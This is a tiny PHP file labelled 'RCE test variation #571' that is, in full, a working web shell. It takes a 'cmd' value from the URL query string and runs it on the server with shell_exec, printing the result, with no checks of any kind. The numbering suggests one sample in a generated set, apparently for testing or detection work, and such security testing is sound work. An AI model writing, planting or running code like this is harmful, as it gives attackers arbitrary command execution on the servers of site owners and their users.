<?php
// RCE test variation #571
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>